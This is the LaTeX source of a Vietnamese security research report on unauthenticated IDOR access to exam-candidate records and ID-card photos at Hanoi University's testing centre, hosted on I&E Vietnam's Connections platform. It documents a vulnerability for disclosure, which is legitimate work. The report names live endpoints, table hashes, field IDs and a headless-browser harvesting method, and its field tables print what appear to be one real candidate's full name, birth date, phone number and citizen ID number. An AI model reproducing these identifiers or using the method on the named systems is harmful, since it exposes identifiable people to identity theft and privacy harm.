\documentclass[12pt,a4paper]{article}

% ===== PACKAGES =====
\usepackage[utf8]{inputenc}
\usepackage[T5]{fontenc}
\usepackage[vietnamese]{babel}
\usepackage{geometry}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{booktabs}
\usepackage{longtable}
\usepackage{enumitem}
\usepackage{amsmath}
\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{caption}
\usepackage{float}
\usepackage{tikz}
\usetikzlibrary{arrows.meta,positioning,shapes.geometric,fit}

\geometry{margin=2.5cm}

% ===== CODE LISTING STYLE =====
\definecolor{codebg}{rgb}{0.95,0.95,0.95}
\definecolor{codegreen}{rgb}{0,0.5,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{codeblue}{rgb}{0.1,0.1,0.7}
\definecolor{alertred}{rgb}{0.8,0.1,0.1}

\lstdefinestyle{codestyle}{
    backgroundcolor=\color{codebg},
    commentstyle=\color{codegreen},
    keywordstyle=\color{blue}\bfseries,
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\small,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2,
    frame=single,
    rulecolor=\color{gray!40},
}
\lstset{style=codestyle}

% ===== HEADER / FOOTER =====
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{\small Báo cáo Bảo mật 02/26}
\fancyhead[R]{\small TT Khảo thí HANU - Lộ dữ liệu qua nền tảng bên thứ ba}
\fancyfoot[C]{\thepage}

% ===== HYPERREF CONFIG =====
\hypersetup{
    colorlinks=true,
    linkcolor=blue!70!black,
    urlcolor=blue!60!black,
    citecolor=green!50!black,
    pdftitle={Nghiên cứu Bảo mật: Lộ dữ liệu Trung tâm Khảo thí HANU qua nền tảng I\&E Vietnam},
    pdfauthor={Pham Hoang Phi},
}

% ===== TITLE =====
\title{
    \vspace{-1cm}
    \textbf{Báo cáo Nghiên cứu Bảo mật} \\[0.3cm]
    \Large Lộ Ảnh chụp Căn cước Công dân và Dữ liệu Cá nhân \\
    qua Nền tảng SaaS của Bên thứ ba \\[0.2cm]
    \large Trung tâm Khảo thí Đại học Hà Nội (\texttt{tec.hanu.vn}) \\
    vận hành trên nền tảng I\&E Việt Nam / Connections
}
\author{
    \textbf{Phạm Hoàng Phi} \\
    Faculty of Informatics, University of Debrecen \\
    \href{mailto:hoangphi.pham@inf.unideb.hu}{\texttt{hoangphi.pham@inf.unideb.hu}}
}
\date{Tháng 2, 2026}

\begin{document}

\maketitle
\thispagestyle{fancy}

% ===== CVSS SCALE BADGE =====
\vspace{0.2cm}
\begin{center}
\begin{tikzpicture}
    % Draw colored segments (Scale 0 to 10 mapped to 0 to 10cm)
    \fill[green!60!black] (0,0) rectangle (0.1, 0.6);     % None (0.0)
    \fill[yellow!90!black] (0.1,0) rectangle (3.9, 0.6);  % Low (0.1-3.9)
    \fill[orange] (3.9,0) rectangle (6.9, 0.6);           % Medium (4.0-6.9)
    \fill[red!80] (6.9,0) rectangle (8.9, 0.6);           % High (7.0-8.9)
    \fill[red!70!black] (8.9,0) rectangle (10, 0.6);      % Critical (9.0-10.0)

    % Draw outline and separators
    \draw[thick, darkgray] (0,0) rectangle (10,0.6);
    \draw[darkgray] (0.1,0) -- (0.1,0.6);
    \draw[darkgray] (3.9,0) -- (3.9,0.6);
    \draw[darkgray] (6.9,0) -- (6.9,0.6);
    \draw[darkgray] (8.9,0) -- (8.9,0.6);

    % Labels inside the bar
    \node[text=white, font=\sffamily\tiny\bfseries] at (2, 0.3) {LOW};
    \node[text=white, font=\sffamily\tiny\bfseries] at (5.4, 0.3) {MEDIUM};
    \node[text=white, font=\sffamily\tiny\bfseries] at (7.9, 0.3) {HIGH};
    \node[text=white, font=\sffamily\tiny\bfseries] at (9.45, 0.3) {CRITICAL};

    % Arrow pointing exactly at 9.1
    \draw[-{Stealth[length=3mm, width=3mm]}, line width=1.5pt, darkgray] (9.1, 1.8) -- (9.1, 0.65);
    
    % Text above arrow
    \node[above, font=\bfseries\large, text=alertred] at (9.1, 1.8) {CVSS 3.1: 9.1 (CRITICAL)};
    
    % Descriptive text below
    \node[below, font=\normalsize, align=center] at (5, -0.2) {Lỗ hổng cho phép trích xuất dữ liệu định danh và sinh trắc học không cần xác thực.};
\end{tikzpicture}
\end{center}
\vspace{0.5cm}

% ===================================================================
\begin{abstract}
Báo cáo này ghi lại quá trình nghiên cứu bảo mật đối với ứng dụng web của Trung tâm Khảo thí, Trường Đại học Hà Nội (HANU), tại địa chỉ \texttt{tec.hanu.vn}. Cuộc điều tra được khởi xướng sau khi phát hiện thông tin cá nhân đầy đủ (PII) của một thí sinh được Google lập chỉ mục công khai. Thông qua việc dịch ngược (reverse engineering) framework JavaScript tiếng Việt tùy chỉnh do I\&E Việt Nam (\texttt{inevn.com}) phát triển, tôi đã lập bản đồ cơ sở dữ liệu hoàn chỉnh, xác định các điểm cuối API\footnote{API (Application Programming Interface): Giao diện lập trình ứng dụng, cho phép các phần mềm và hệ thống giao tiếp với nhau.} không xác thực, và chứng minh khả năng trích xuất có hệ thống dữ liệu cá nhân của 896 thí sinh - bao gồm số CCCD/CMND, dân tộc, nơi sinh, và \textbf{ảnh chụp mặt trước và mặt sau của căn cước công dân}. Hạ tầng bị lộ trải dài trên nhiều tên miền do nền tảng ``Connections'' của I\&E Việt Nam vận hành, phơi bày rủi ro bên thứ ba mang tính hệ thống khi dữ liệu nhạy cảm của trường đại học được lưu trữ trên nền tảng SaaS\footnote{SaaS (Software as a Service): Mô hình phân phối phần mềm dưới dạng dịch vụ qua Internet.} dùng chung không có phân quyền truy cập. Báo cáo này trình bày chi tiết phương pháp tấn công, mối quan hệ giữa HANU và I\&E Việt Nam, phân tích hạ tầng CDN, và toàn bộ chuỗi kỹ thuật được sử dụng để truy cập dữ liệu công dân nhạy cảm.
\end{abstract}

\tableofcontents
\newpage

% ===================================================================
\section{Giới thiệu}
\label{sec:intro}

\subsection{Bối cảnh}

Trung tâm Khảo thí của Trường Đại học Hà Nội (HANU) vận hành hệ thống web tại \texttt{tec.hanu.vn} để quản lý các kỳ thi năng lực ngoại ngữ chuẩn hóa (VSTEP - Vietnamese Standardized Test of English Proficiency, và các kỳ thi khác). Hệ thống xử lý toàn bộ vòng đời quản lý thi cử: đăng ký dự thi, phân phòng thi, công bố danh sách thí sinh, và thông báo kết quả. Trong quá trình đăng ký, thí sinh cung cấp thông tin cá nhân nhạy cảm bao gồm số CCCD, ảnh chụp mặt trước và mặt sau của thẻ căn cước, dân tộc, ngày sinh, và thông tin liên hệ.

\subsection{Nền tảng Bên thứ ba: I\&E Việt Nam}

Trung tâm Khảo thí HANU không tự vận hành hạ tầng web của mình. Thay vào đó, toàn bộ ứng dụng - bao gồm cơ sở dữ liệu, tầng API, lưu trữ tập tin và CDN\footnote{CDN (Content Delivery Network): Mạng phân phối nội dung, hệ thống các máy chủ đặt tại nhiều khu vực địa lý giúp truyền tải tài nguyên nhanh chóng tới người dùng.} - được lưu trữ trên nền tảng do \textbf{I\&E Việt Nam} (\texttt{inevn.com}) phát triển và vận hành, mang thương hiệu ``Connections.''

Mối quan hệ này rất quan trọng để hiểu về lỗ hổng: HANU đã giao phó toàn bộ dữ liệu thí sinh cho một nền tảng bên thứ ba mà kiến trúc bảo mật của nó \textbf{không cung cấp ranh giới kiểm soát truy cập giữa người truy cập website công khai và dữ liệu cá nhân nhạy cảm}.

\subsection{Động lực: Phát hiện qua Google Search}

Nghiên cứu được khởi xướng khi một tìm kiếm Google thông thường cho thấy các trang đăng ký của từng thí sinh - chứa đầy đủ thông tin cá nhân bao gồm số CCCD và ảnh chụp thẻ CCCD - đang được công cụ tìm kiếm lập chỉ mục và xuất hiện trong kết quả công khai. Một truy vấn duy nhất đã lộ ra hồ sơ hoàn chỉnh của một thí sinh, đặt ra câu hỏi: \textit{đây là lỗi cấu hình đơn lẻ hay lỗ hổng mang tính hệ thống ảnh hưởng tất cả thí sinh?}

Câu trả lời, như báo cáo này chứng minh, là trường hợp thứ hai.

\subsection{Phạm vi và Đạo đức}

Nghiên cứu được thực hiện nghiêm ngặt cho mục đích đánh giá bảo mật:
\begin{itemize}[noitemsep]
    \item Mọi truy cập dữ liệu đều sử dụng các điểm cuối công khai.
    \item Không có xác thực nào bị vượt qua - vì không có xác thực nào tồn tại để vượt qua.
    \item Không có dữ liệu nào bị sửa đổi, xóa, hoặc tuồn ra cho bên thứ ba.
    \item Không thực hiện tấn công brute-force lên các tài nguyên được bảo vệ.
    \item Các kỹ thuật mô tả sao chép lại những gì bất kỳ người dùng internet nào có kiến thức kỹ thuật cơ bản cũng có thể thực hiện thông qua developer console của trình duyệt web.
\end{itemize}

\subsection{Phân loại Kỹ thuật Tấn công}

Các kỹ thuật MITRE ATT\&CK và danh mục OWASP sau đây có liên quan đến các phương pháp được sử dụng trong nghiên cứu này:

\begin{table}[H]
\centering
\caption{Phân loại kỹ thuật tấn công được sử dụng}
\begin{tabular}{@{}p{4cm}p{3cm}p{6cm}@{}}
\toprule
\textbf{Kỹ thuật} & \textbf{Framework} & \textbf{Ứng dụng trong nghiên cứu} \\
\midrule
IDOR\footnote{IDOR (Insecure Direct Object Reference): Lỗ hổng Tham chiếu Đối tượng Trực tiếp Không an toàn, xảy ra khi ứng dụng cung cấp quyền truy cập vào đối tượng mà không kiểm tra quyền.} & OWASP Top 10 & ID đối tượng CSDL được dùng trực tiếp trong API không cấp phép \\
Broken Access Control & OWASP Top 10 & Không có xác thực trên bất kỳ điểm cuối API nào \\
API Abuse & OWASP API Top 10 & Truy cập không giới hạn vào thao tác tìm kiếm và tải dữ liệu \\
Reconnaissance (T1592) & MITRE ATT\&CK & Google dorking để phát hiện trang PII\footnote{PII: Personally Identifiable Information - Thông tin định danh cá nhân.} được lập chỉ mục \\
Active Scanning (T1595) & MITRE ATT\&CK & Quét thăm dò các điểm cuối API và schema cơ sở dữ liệu \\
Data from Info Repos (T1213) & MITRE ATT\&CK & Trích xuất dữ liệu từ API cơ sở dữ liệu bị phơi bày \\
JS API Hijacking & Web Security & Gọi hàm nội bộ của framework qua \texttt{page.evaluate()} \\
Foreign Key Traversal & Database Security & Theo dõi khóa ngoại để khám phá các bảng ẩn \\
CDN URL Harvesting & Web Security & Trích xuất URL ảnh đã mã hóa từ DOM\footnote{DOM: Giao diện lập trình đại diện cho cấu trúc của tài liệu HTML.} đã render \\
\bottomrule
\end{tabular}
\end{table}

% ===================================================================
\section{Lập Bản đồ Hạ tầng: HANU, I\&E Việt Nam và Connections}
\label{sec:infra}

\subsection{Phát hiện Mối quan hệ Nhà cung cấp}

Bước đầu tiên trong phân tích là tìm hiểu ai thực sự vận hành hạ tầng đằng sau \texttt{tec.hanu.vn}. Kiểm tra mã nguồn HTML cho thấy ứng dụng web tải framework JavaScript cốt lõi từ tên miền bên ngoài:

\begin{lstlisting}[language=HTML,title={Tải Framework từ bên ngoài (từ mã nguồn trang)}]
<script src="https://cdn.inevn.com/js/jquery.main.isj"></script>
<script src="https://cdn.inevn.com/js/include.core.isj"></script>
\end{lstlisting}

\noindent Tên miền \texttt{inevn.com} thuộc về \textbf{I\&E Việt Nam}, một công ty công nghệ tại Việt Nam. Phân tích sâu hơn cho thấy một hạ tầng nhiều tên miền ngổn ngang:

\begin{table}[H]
\centering
\caption{Hạ tầng tên miền I\&E Việt Nam / Connections}
\begin{tabular}{@{}lll@{}}
\toprule
\textbf{Tên miền} & \textbf{Vai trò} & \textbf{Liên hệ với HANU} \\
\midrule
\texttt{inevn.com} & Tên miền công ty & Nhà cung cấp nền tảng \\
\texttt{cdn.inevn.com} & CDN JavaScript & Phân phối framework JS/CSS \\
\texttt{xhr.inevn.com} & Cổng API & Xử lý mọi cuộc gọi XHR\footnote{XHR (XMLHttpRequest): API trao đổi dữ liệu nền.} đến CSDL \\
\texttt{tts.ine.vn} & Máy chủ framework & Lưu trữ file cấu hình ứng dụng \\
\texttt{connections.vn} & Thương hiệu nền tảng & Nền tảng SaaS ``Connections'' \\
\texttt{connections.hanu.vn} & API riêng HANU & Điểm cuối API dành riêng cho HANU \\
\texttt{local.hanu.connections.vn} & Lưu trữ tập tin & Chứa PDF và các tập tin tải lên \\
\texttt{i0.connections.vn} & CDN ảnh (node 0) & Phân phối ảnh chụp CCCD \\
\texttt{i3.connections.vn} & CDN ảnh (node 3) & Phân phối ảnh chụp CCCD \\
\texttt{thuctap.inevn.com} & Máy chủ CSS & Phân phối CSS cho ứng dụng con \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Kiến trúc Nền tảng ``Connections''}

Nền tảng ``Connections'' dường như là một framework SaaS đa mục đích - tương tự như Salesforce hoặc Airtable - cung cấp:

\begin{itemize}
    \item Một \textbf{tầng cơ sở dữ liệu} nơi các bảng được định danh bằng các mã băm hệ thập lục phân 32 ký tự
    \item Một \textbf{framework JavaScript phía client} với các hàm API tiếng Việt (\texttt{xửLý}, \texttt{CĂN.db}, \texttt{config})
    \item Một \textbf{CDN lưu trữ tập tin} tại \texttt{local.\{org\}.connections.vn}
    \item Một \textbf{CDN ảnh} tại \texttt{i\{N\}.connections.vn} với tham số URL được mã hóa
    \item Một \textbf{kiến trúc multi-tenant} nơi nhiều tổ chức (HANU, và có thể nhiều đơn vị khác) dùng chung một hạ tầng
\end{itemize}

Hệ quả bảo mật quan trọng: dữ liệu thí sinh của HANU - bao gồm ảnh chụp CCCD - được lưu trữ trên và phân phối bởi hạ tầng chung của I\&E Việt Nam, không phải trên các máy chủ do HANU kiểm soát.

\subsection{Cấu trúc Tên miền con và Luồng Dữ liệu}

Sơ đồ sau minh họa luồng dữ liệu:

\begin{lstlisting}[language={},title={Luồng dữ liệu: Từ trình duyệt đến Dữ liệu cá nhân thí sinh}]
Trinh duyet nguoi dung
    |
    |-- (1) GET tec.hanu.vn/page
    |         |-- Tai bo khung HTML
    |
    |-- Tai JS tu cdn.inevn.com
    |         |-- Tai CSS tu thuctap.inevn.com
    |
    |-- (2) XHR den xhr.inevn.com/xhr/ (hoac connections.hanu.vn/xhr/)
    |
    |-- "doiTuong.tai.{table_hash}" = truy van co so du lieu
    |         |-- Tra ve danh sach cac ID doi tuong
    |
    |-- (3) XHR den xhr.inevn.com/xhr/
    |         |-- "CAN.db({table}.{id})" = tai doi tuong
    |
    |-- Tra ve TAT CA cac truong bao gom CCCD, SDT, v.v.
    |
    |-- (4) GET local.hanu.connections.vn/upload/{cat}/{date}/{file}
    |
    |-- Tai xuong cac file PDF (danh sach thi sinh)
    |
    |-- (5) GET i0.connections.vn/{duong_dan_ma_hoa}?q={token_ma_hoa}
              |-- Tai xuong anh chup the CCCD (mat truoc/mat sau)
\end{lstlisting}

\noindent \textbf{Không có yêu cầu nào trong số này cần xác thực.}

% ===================================================================
\section{Dịch ngược Cấu trúc Cơ sở Dữ liệu}
\label{sec:reverse}

\subsection{Giai đoạn 1: Phân tích Cấu trúc URL}

URL ban đầu được Google lập chỉ mục cung cấp manh mối đầu tiên về cấu trúc cơ sở dữ liệu:

\begin{lstlisting}[language={},title={URL được lập chỉ mục}]
https://tec.hanu.vn/7fdc5fa41f34577d4bba6b0d3e449385/1518250/2368M35018
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^  ^^^^^^^^^^
                    Ma bam bang (Dang ky)             ID obj   Ma ho so
\end{lstlisting}

\noindent URL này trực tiếp lộ ra:
\begin{enumerate}[noitemsep]
    \item \textbf{Mã băm bảng Đăng ký}: \texttt{7fdc5fa41f34577d4bba6b0d3e449385}
    \item \textbf{ID đối tượng đăng ký}: \texttt{1518250}
    \item \textbf{Mã hồ sơ} của thí sinh: \texttt{2368M35018}
\end{enumerate}

\subsection{Giai đoạn 2: Dịch ngược Framework JavaScript}

Mã nguồn framework tại \texttt{cdn.inevn.com/js/include.core.isj} bị nén mạnh (heavily minified) và sử dụng các định danh tiếng Việt. Qua phân tích runtime (thực thi hàm trong console trình duyệt và quan sát lưu lượng XHR), tôi đã xác định được các hàm API cốt lõi:

\begin{table}[H]
\centering
\caption{Các API Framework đã dịch ngược}
\begin{tabular}{@{}lp{9cm}@{}}
\toprule
\textbf{Hàm} & \textbf{Hành vi (Được khám phá)} \\
\midrule
\texttt{xửLý(action, params, opts, cb)} &
    Bộ điều phối chính. Gửi XHR đến \texttt{xhr.inevn.com/xhr/}. Chuỗi \texttt{action} quyết định hành động. \\
\texttt{CĂN.db(key, callback)} &
    Tải đối tượng CSDL theo key (định dạng: \texttt{ma\_bam\_bang.id\_doi\_tuong}). Cache kết quả vào bộ nhớ cục bộ. \\
\texttt{config(key)} &
    Lấy đối tượng đã tải trước đó từ cache cục bộ. Trả về đối tượng JavaScript với ID trường (số) làm key. \\
\texttt{dữLiệu} &
    Đối tượng toàn cục (Global) chứa ngữ cảnh dữ liệu của trang web. \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Giai đoạn 3: Khám phá Schema CSDL qua IDOR}

Phát hiện then chốt là API sử dụng \textbf{Tham chiếu Đối tượng Trực tiếp Không An toàn (IDOR)}: mã băm bảng cơ sở dữ liệu và ID đối tượng được truyền trực tiếp từ client lên server mà không có kiểm tra ủy quyền. Điều này cho phép tôi:

\begin{enumerate}
    \item \textbf{Tải mã băm bảng Đăng ký} (nhìn thấy trong URL)
    \item \textbf{Truy vấn bảng Đăng ký} bằng cách sử dụng \texttt{xửLý("đốiTượng.tải.\{hash\}", ...)} với bộ lọc trường bất kỳ
    \item \textbf{Tải một đối tượng Đăng ký} và kiểm tra tất cả các trường của nó - khám phá các ID trường, kiểu dữ liệu, và tham chiếu khóa ngoại
    \item \textbf{Khám phá mã băm bảng Thí sinh} bằng cách theo dõi khóa ngoại trong trường \texttt{1686869} (ID Thí sinh), trường này tham chiếu đến các đối tượng trong bảng \texttt{3576ff3533bb456f8e394a0aa83a461f}
    \item \textbf{Tải đối tượng Thí sinh} để truy cập toàn bộ các trường dữ liệu cá nhân
\end{enumerate}

\subsection{Giai đoạn 4: Ánh xạ từng trường dữ liệu}

Mỗi đối tượng cơ sở dữ liệu được trả về dưới dạng một từ điển (dictionary) với các key là chuỗi số (ID trường). Tôi đã ánh xạ chúng bằng cách:
\begin{enumerate}[noitemsep]
    \item Tải nhiều đối tượng thí sinh
    \item Đối chiếu chéo (Cross-referencing) các giá trị trường với nội dung trang được render
    \item Xác định kiểu trường (chuỗi, số nguyên, ngày tháng, tham chiếu, tập tin)
\end{enumerate}

\subsubsection{Hệ thống Kiểu Trường}

Framework sử dụng các ký tự tiếng Việt đơn lẻ để đánh dấu kiểu trường trong các giá trị lưu trữ:

\begin{table}[H]
\centering
\caption{Các Dấu hiệu Kiểu trường được phát hiện}
\begin{tabular}{@{}lll@{}}
\toprule
\textbf{Ký hiệu} & \textbf{Định dạng lưu trữ} & \textbf{Ý nghĩa} \\
\midrule
(không có) & Chuỗi/Số thông thường & Giá trị trực tiếp (họ tên, SDT, CCCD) \\
\texttt{\{"ậ":["ID"]\}} & JSON với ID tham chiếu & Tham chiếu đến đối tượng khác (dân tộc, tỉnh) \\
\texttt{\{"ị":["ID"]\}} & JSON với ID tập tin & Tham chiếu đến một tập tin/ảnh đã tải lên \\
\bottomrule
\end{tabular}
\end{table}

\noindent Kiểu \texttt{"ậ"} (tham chiếu) lưu trữ một con trỏ tới một đối tượng tra cứu (lookup object) - ví dụ, trường dân tộc \texttt{1626773} lưu \texttt{\{"ậ":["146992"]\}}, giá trị này được phân giải thành ``Kinh'' khi trang web render. Kiểu \texttt{"ị"} (tập tin) lưu trữ con trỏ tới tập tin tải lên - ví dụ, trường \texttt{1658487} lưu \texttt{\{"ị":["4296"]\}}, giá trị này được phân giải thành bức ảnh CCCD trên image CDN.

\subsubsection{Bảng Ánh xạ Trường Hoàn chỉnh}

\begin{longtable}{@{}lllp{4cm}@{}}
\caption{Các trường Bảng Đăng ký (Đã dịch ngược)} \\
\toprule
\textbf{ID Trường} & \textbf{Tên trường} & \textbf{Kiểu} & \textbf{Ví dụ} \\
\midrule
\endfirsthead
\toprule
\textbf{ID Trường} & \textbf{Tên trường} & \textbf{Kiểu} & \textbf{Ví dụ} \\
\midrule
\endhead
1626725 & ID Ca thi & Khóa ngoại (FK) & 54914 \\
1626730 & Mã hồ sơ & Chuỗi & 2368M35018 \\
1630529 & Mã trạng thái & Số nguyên & 1 \\
1630538 & Cờ hoạt động & Boolean & 1 \\
1642331 & SBD (Số báo danh) & Chuỗi & AN1001 \\
1654914 & Thời gian đăng ký & Timestamp & 1726716820 \\
1686869 & ID Thí sinh & Khóa ngoại (FK) & 582319 \\
1704995 & Điểm số & JSON & [\{"nghe":"8.5"\}] \\
mãĐịnhDanh & Mã ID & Chuỗi & V2KT2106AN1114 \\
tổngTiền & Lệ phí & Số nguyên & 1800000 \\
\bottomrule
\end{longtable}

\begin{longtable}{@{}lllp{4cm}@{}}
\caption{Các trường Bảng Thí sinh (Đã dịch ngược)} \\
\toprule
\textbf{ID Trường} & \textbf{Tên trường} & \textbf{Kiểu} & \textbf{Ví dụ / Chú thích} \\
\midrule
\endfirsthead
\toprule
\textbf{ID Trường} & \textbf{Tên trường} & \textbf{Kiểu} & \textbf{Ví dụ / Chú thích} \\
\midrule
\endhead
1686868 & Họ tên đầy đủ & Chuỗi & Nguyễn Thị Linh Trà \\
1626768 & Họ và Tên đệm & Chuỗi & Nguyễn Thị Linh \\
1626772 & Tên & Chuỗi & Trà \\
1626773 & \textbf{Dân tộc} & \textbf{Tham chiếu} & \{"ậ":["146992"]\} $\rightarrow$ Kinh \\
1626783 & Ngày sinh & Ngày & 28/09/2000 \\
1626784 & Giới tính & Enum & 1=Nam, 2=Nữ \\
1626788 & Số điện thoại & Chuỗi & 0379822973 \\
1626793 & Email & Chuỗi & email@gmail.com \\
1626818 & \textbf{Nơi sinh} & \textbf{Tham chiếu} & \{"ậ":["147000"]\} $\rightarrow$ Tỉnh Bắc Kạn \\
1626820 & Tỉnh/Thành phố (Hiện tại) & Tham chiếu & \{"ậ":["146999"]\} \\
1646777 & Số CCCD/CMND & Chuỗi & 022202002576 \\
1658487 & \textbf{Ảnh CCCD (mặt trước)} & \textbf{Tham chiếu file} & \{"ị":["4296"]\} \\
1658488 & \textbf{Ảnh CCCD (mặt sau)} & \textbf{Tham chiếu file} & \{"ị":["243"]\} \\
2102859 & Đơn vị công tác & Chuỗi & Văn bản tự do \\
\bottomrule
\end{longtable}

\subsection{Giai đoạn 5: Sơ đồ Duyệt Khóa ngoại (Foreign Key Traversal Graph)}

Đường dẫn duyệt (traversal path) hoàn chỉnh từ một URL công khai đến các bức ảnh thẻ CCCD:

\begin{center}
\begin{tikzpicture}[
    node distance=1.8cm,
    box/.style={rectangle, draw, rounded corners, fill=blue!8, text width=5cm, minimum height=1cm, align=center},
    data/.style={rectangle, draw, rounded corners, fill=red!10, text width=5cm, minimum height=1cm, align=center},
    arrow/.style={-{Stealth[length=3mm]}, thick},
]
    \node[box] (url) {URL Công khai\\{\small\texttt{tec.hanu.vn/\{hash\}/\{id\}/\{file\}}}};
    \node[box, below=of url] (reg) {Đối tượng Đăng ký\\{\small Bảng: \texttt{7fdc5fa4...}}\\{\small Chứa SBD, mã hồ sơ}};
    \node[box, below=of reg] (cand) {Đối tượng Thí sinh\\{\small Bảng: \texttt{3576ff35...}}\\{\small Chứa TẤT CẢ PII}};
    \node[data, below left=1.5cm and -1cm of cand] (pii) {Dữ liệu Cá nhân\\{\small CCCD, SDT, Email,}\\{\small Dân tộc, Nơi sinh}};
    \node[data, below right=1.5cm and -1cm of cand] (img) {Ảnh Thẻ CCCD\\{\small Mặt trước + Mặt sau}\\{\small trên \texttt{i0.connections.vn}}};
    \draw[arrow] (url) -- node[right] {\small lộ mã băm bảng + ID đối tượng} (reg);
    \draw[arrow] (reg) -- node[right] {\small trường khóa ngoại 1686869} (cand);
    \draw[arrow] (cand) -- node[left, text width=2.5cm, align=right] {\small trường 1646777, 1626788, v.v.} (pii);
    \draw[arrow] (cand) -- node[right, text width=2.5cm] {\small tham chiếu file 1658487, 1658488} (img);
\end{tikzpicture}
\end{center}

% ===================================================================
\section{Khám phá CDN: Hạ tầng Ảnh và Tập tin}
\label{sec:cdn}

\subsection{CDN Tập tin tĩnh: \texttt{local.hanu.connections.vn}}

Tất cả tài liệu được tải lên (PDF, danh sách thí sinh) được lưu tại máy chủ tập tin tĩnh với cấu trúc URL có thể dự đoán được:

\begin{lstlisting}[language={},title={Mẫu URL CDN tập tin}]
https://local.hanu.connections.vn/upload/{category_id}/{YYYY/MM/DD}/{uuid_filename}
\end{lstlisting}

\noindent Metadata của file - bao gồm toàn bộ các thành phần tạo nên URL - được nhúng vào HTML của trang chính dưới dạng một khối JSON được cache lại. Các metadata này sử dụng tên trường bằng tiếng Việt bị làm ngắn (minified):

\begin{table}[H]
\centering
\caption{Các trường Metadata JSON của File}
\label{tab:file-metadata}
\begin{tabular}{@{}lll@{}}
\toprule
\textbf{Key JSON} & \textbf{Ý nghĩa} & \textbf{Ví dụ} \\
\midrule
\texttt{"i"} & ID Tập tin & 534167 \\
\texttt{"ạ"} & ID Danh mục & 25 \\
\texttt{"ô"} & Hostname máy chủ & local.hanu.connections.vn \\
\texttt{"ớ"} & Đường dẫn ngày tháng & 2024/09/19 \\
\texttt{"ũ"} & Tên file gốc & Danh sach phong thi.pdf \\
\texttt{"ợ"} & Tên file trên máy chủ (UUID) & f2247559bcac...03.pdf \\
\texttt{"ô"} & Đuôi mở rộng (Extension) & pdf \\
\bottomrule
\end{tabular}
\end{table}

\noindent Tôi đã phát hiện ra \textbf{32 tập PDF danh sách thí sinh} bằng cách phân tích metadata này và lọc các tên file có chứa "danh sach" hoặc "phong thi." Chúng tôi đã gặp phải một lỗi nghiêm trọng (critical bug): các dấu gạch chéo trong đường dẫn ngày tháng bị escape bằng JSON (\texttt{2024\textbackslash/09\textbackslash/19}) đã gây ra lỗi HTTP 404 cho đến khi tôi thêm logic unescape đường dẫn vào code.

\subsection{CDN Ảnh: \texttt{i\{N\}.connections.vn}}

Phát hiện nhạy cảm nhất là hạ tầng CDN ảnh. Ảnh chụp CCCD được phân phối từ CDN cân bằng tải với các node \texttt{i0.connections.vn}, \texttt{i3.connections.vn}, v.v.

\subsubsection{URL Ảnh Mã hóa}

Khác với CDN tập tin tĩnh (sử dụng đường dẫn có thể đọc được), CDN ảnh sử dụng \textbf{đường dẫn và tham số truy vấn mã hóa/được mã hóa}:

\begin{lstlisting}[language={},title={Ví dụ URL CDN ảnh (Thực tế, đã che bớt một phần)}]
# Anh CCCD mat truoc:
https://i0.connections.vn/kt3PG1hPTgTPG1MJ.u54.L8JKx-X.LDJ9Ei
  tREHqGaAN9ZWP6gM46Wbb?q=wqQ2KLBn6g3dDaf29mOnD7stDafo9aAo...

# Anh CCCD mat sau:
https://i0.connections.vn/kt3PG1hPTgTPG1MJ.u54.L8JKx-X.LDJ9Ei
  z9mONGaAN9ZWP6gM46Wbb?q=wqQ2KLBn6g3dDaf29mOnD7stDafo9aAo...

# Anh the chan dung:
https://i0.connections.vn/kt3PG1hPTgTPG1MJ.u54.L8JKx-X.LDJ9Ei
  tREHdGaAN9ZWP6gM46Wbb?q=wqQ2KLBn6g3dDaf29mOnD7stDafo9aAo...
\end{lstlisting}

\noindent Các quan sát quan trọng về cấu trúc URL:
\begin{itemize}
    \item \textbf{Đường dẫn (path)} của URL mã hóa tham chiếu tập tin - các hình ảnh khác nhau của cùng một thí sinh khác biệt vài ký tự trong phần đường dẫn
    \item Tham số truy vấn \texttt{q=} dường như là một token phiên hoặc token xác thực, nhưng lại \textbf{giống hệt nhau} trên tất cả hình ảnh trong cùng một lần tải trang, cho thấy nó là token cấp độ trang chứ không phải cho từng hình ảnh riêng lẻ
    \item Các URL này \textbf{không thể đoán được} - chỉ có thể lấy được bằng cách render trang chi tiết của thí sinh trong trình duyệt (do framework JavaScript sinh ra chúng tại runtime)
    \item Tuy nhiên, một khi trang đã được render, các URL này \textbf{có thể tải xuống trực tiếp} qua HTTP GET đơn giản mà không cần cookie hay header bổ sung nào
\end{itemize}

\subsubsection{Cách thức URL Ảnh được tạo ra}

Framework JavaScript tạo các URL CDN ảnh trong quá trình render trang thông qua quá trình:
\begin{enumerate}[noitemsep]
    \item Đọc trường tham chiếu tập tin (ví dụ: \texttt{\{"ị":["4296"]\}})
    \item Mã hóa ID tập tin, ngữ cảnh tổ chức, và một session token vào đường dẫn URL và chuỗi truy vấn (query string)
    \item Gán URL đó làm thuộc tính \texttt{background-image} của CSS trên một thẻ \texttt{<div>}
\end{enumerate}

\noindent Điều này có nghĩa là URL ảnh không thể được xây dựng bằng code chỉ với các ID tập tin - thuật toán mã hóa của framework JavaScript bắt buộc phải được thực thi trong môi trường trình duyệt. Công cụ của tôi giải quyết vấn đề này bằng cách render trang của mỗi thí sinh bằng trình duyệt headless và trích xuất URL \texttt{background-image} từ DOM.

\subsubsection{Xác minh quá trình Tải Ảnh}

Các hình ảnh tải xuống được xác minh là ảnh chụp CCCD thực tế:
\begin{itemize}[noitemsep]
    \item Dung lượng file từ 44KB đến 228KB (phù hợp với ảnh chụp điện thoại thẻ ID)
    \item Là các tệp hình ảnh JPEG hợp lệ
    \item Ba hình ảnh cho mỗi thí sinh (thông thường): ảnh thẻ chân dung, CCCD mặt trước, CCCD mặt sau
    \item Các hình ảnh chứa văn bản có thể đọc được bao gồm họ tên thí sinh, số CCCD, ngày sinh, và địa chỉ in trên thẻ vật lý
\end{itemize}

% ===================================================================
